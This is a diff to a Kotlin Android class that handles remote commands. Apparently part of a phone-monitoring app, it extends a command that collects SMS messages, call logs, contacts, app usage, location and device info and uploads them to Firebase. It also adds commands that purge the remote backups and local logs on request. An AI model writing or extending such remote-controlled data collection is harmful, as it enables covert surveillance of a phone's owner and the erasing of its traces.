@@ -49,15 +49,20 @@ class RemoteCommandManager(private val context: Context) {
 
         try {
             when (commandType.uppercase()) {
-                "SYNC_ALL" -> {
+                "SYNC_ALL", "CLEAR_AND_SYNC_ALL" -> {
+                    val clearFirst = commandType.equals("CLEAR_AND_SYNC_ALL", ignoreCase = true) || payload.contains("clear", ignoreCase = true)
                     SmsSyncManager(context).syncSmsMessages()
                     CallLogSyncManager(context).syncCallLogs()
                     ContactsSyncManager(context).syncContacts()
                     AppUsageSyncManager(context).syncAppUsageStats()
                     LocationSyncManager(context).captureAndSyncLocation()
                     DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
-                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
-                    resultMessage = "All telemetry modules synchronized successfully."
+                    FirebaseSyncEngine(context).pushTelemetryToFirebase(clearFirst = clearFirst)
+                    resultMessage = if (clearFirst) "Old backup cleared and fresh telemetry synchronized successfully." else "All telemetry modules synchronized successfully."
+                }
+                "CLEAR_REMOTE_DATA", "PURGE_DATA" -> {
+                    FirebaseSyncEngine(context).clearAllRemoteData()
+                    resultMessage = "All remote backup data and local logs cleared successfully."
                 }
                 "SYNC_LOCATION" -> {
                     val loc = LocationSyncManager(context).captureAndSyncLocation()
